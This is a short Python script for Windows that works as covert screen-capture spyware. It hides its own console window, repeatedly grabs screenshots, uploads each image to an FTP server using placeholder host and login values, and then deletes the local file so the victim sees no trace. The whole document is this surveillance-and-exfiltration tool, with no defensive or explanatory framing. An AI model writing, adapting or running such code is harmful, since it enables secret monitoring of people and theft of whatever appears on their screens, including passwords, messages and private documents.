import os,os.path,ftplib,time,win32console,win32gui,_winreg,sys

try:
	import pyscreenshot

except:
	print "\ninstalling ""pyscreenshot"" \n"
	os.system("pip install pyscreenshot")
	exit(0)

# hiding console screen 
win32gui.ShowWindow(win32console.GetConsoleWindow(),0)

# upload function
def upload(file,dirction,host,user,password):
	#connecting
	try:
		ftp=ftplib.FTP(host,user,password)
	except Exception as e:
		if e != " 530 You're already logged in" :
			print "\n %s" % e
			ftp.close() 
			exit()	
	#Uploading
	if os.path.exists(file)==True:
		ffile=open(file,"rb") 
		n="STOR "+str(file)
		ftp.storbinary(n,ffile)
		ffile.close()
		os.remove(file)
	else:
		exit()

# sceenshot fnction 
def main():
	for count in range(10000) :
		name=str(time.strftime("%I-%M-%S %p"))+".jpg"
		pyscreenshot.grab_to_file(name)
		upload(name,"ftp path","Ftp.host","username","Password")
		print name
if __name__ == '__main__':
	main()